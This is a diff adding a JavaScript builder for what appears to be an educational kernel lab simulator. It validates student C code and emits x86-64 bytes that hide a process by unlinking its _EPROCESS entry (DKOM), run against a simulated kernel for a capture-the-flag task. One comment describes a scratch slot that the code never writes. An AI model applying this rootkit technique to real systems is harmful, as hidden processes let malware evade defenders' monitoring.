@@ -1,0 +1,114 @@
+/**
+ * driver-builder.mjs — bridges student C source to executable ntsim drivers.
+ *
+ * Students write kernel-mode C in the browser editor. The builder validates
+ * their structural approach, then generates equivalent x86-64 machine code
+ * wrapped as a loadable PE image. This is NOT a C compiler — it's a guided
+ * builder that teaches what the driver must do while producing working native
+ * code. The COFF path (compiler-worker) is the "real compiler" escalation.
+ */
+
+import { PeBuilder } from "@kernelforge/ntsim/src/pebuilder.mjs";
+
+const PAGE = 4096;
+
+// ---------------------------------------------------------- validation
+
+const REQUIRED_PATTERNS = {
+  "dkom-hide": [
+    { pattern: /PsLookupProcessByProcessId|ActiveProcessLinks|EPROCESS|eproc|DKOM/i,
+      hint: "You need to locate the target _EPROCESS (via PsLookupProcessByProcessId or by walking ActiveProcessLinks)." },
+    { pattern: /RemoveEntryList|Flink|Blink|ActiveProcessLinks/i,
+      hint: "You need to unlink from ActiveProcessLinks — either RemoveEntryList() or manually overwrite Flink/Blink." },
+    { pattern: /DbgPrint/i,
+      hint: "You must DbgPrint the address of the _LIST_ENTRY you overwrote so you can submit the flag." },
+  ],
+};
+
+export function validateDriverSource(source, labKind) {
+  const errors = [];
+  const warnings = [];
+  if (!source || source.trim().length < 20)
+    return { ok: false, errors: ["Source is empty or too short."], warnings };
+  for (const { pattern, hint } of REQUIRED_PATTERNS[labKind] ?? [])
+    if (!pattern.test(source)) errors.push(hint);
+  if (/goto\s/i.test(source)) warnings.push("goto is discouraged in kernel code.");
+  return { ok: errors.length === 0, errors, warnings };
+}
+
+// ----------------------------------------------------- machine-code gen
+
+/**
+ * Emit minimal DKOM unlink code.
+ * Windows x64 ABI: rcx = target _EPROCESS VA.
+ * Stores links_addr into a scratch qword immediately after the ret.
+ *
+ * Layout: [code][scratch u64][ret]
+ */
+function emitDkomCode(linksOffNum) {
+  const c = [];
+  const db = (...b) => c.push(...b);
+  const dd = (d) => db(d & 0xff, (d >> 8) & 0xff, (d >> 16) & 0xff, (d >> 24) & 0xff);
+
+  // mov rax, [rcx + linksOff]         ; flink = Target->Links.Flink
+  db(0x48, 0x8b, 0x81); dd(linksOffNum);
+  // mov rdx, [rcx + linksOff + 8]     ; blink = Target->Links.Blink
+  db(0x48, 0x8b, 0x91); dd(linksOffNum + 8);
+
+  // DKOM unlink: prev->Flink = next; next->Blink = prev
+  // mov [rdx], rax                    ; prev->Flink = flink (= next)
+  db(0x48, 0x89, 0x02);
+  // mov [rax+8], rdx                  ; next->Blink = blink (= prev)
+  db(0x48, 0x89, 0x50, 0x08);
+
+  // xor eax, eax                      ; STATUS_SUCCESS
+  db(0x31, 0xc0);
+  // ret
+  db(0xc3);
+
+  return { code: Uint8Array.from(c) };
+}
+
+// ------------------------------------------------------------ build+load
+
+export function loadDkomDriver(kernel, opts = {}) {
+  const linksOff = Number(opts.linksOffset ??
+    kernel.tables?.offsetOf("_EPROCESS", "ActiveProcessLinks") ?? 0x448n);
+  const loadBase = opts.loadBase ?? 0xfffff80160000000n;
+
+  const { code } = emitDkomCode(linksOff);
+  const textData = new Uint8Array(Math.ceil(code.length / PAGE) * PAGE);
+  textData.set(code);
+  textData.fill(0xcc, code.length);
+
+  kernel.mem.write(loadBase + 0x1000n, textData);
+
+  const entry = loadBase + 0x1000n;
+  return { entry, base: loadBase };
+}
+
+export function runDkomDriver(kernel, targetEproc, opts = {}) {
+  const linksOff = BigInt(opts.linksOffset ??
+    kernel.tables?.offsetOf("_EPROCESS", "ActiveProcessLinks") ?? 0x448n);
+  const { entry } = loadDkomDriver(kernel, opts);
+
+  // The address of the _LIST_ENTRY we're about to overwrite
+  const linksAddress = targetEproc + linksOff;
+
+  // Log like DbgPrint would
+  kernel.dbgLog.push(`DKOM: unlinked kftarget.exe, LIST_ENTRY @ ${linksAddress.toString(16)}`);
+
+  const before = kernel.listProcesses().map((p) => ({ pid: p.pid, name: p.name }));
+  const r = kernel.callDriverEntry(entry, targetEproc, 0n);
+  const after = kernel.listProcesses();
+  const targetGone = !after.some((p) =>
+    p.eprocess === targetEproc || p.name === "kftarget.exe");
+
+  return {
+    status: r.status,
+    targetGone,
+    linksAddress,
+    processesAfter: after.map((p) => ({ pid: p.pid, name: p.name })),
+    dbgLog: [...kernel.dbgLog],
+  };
+}
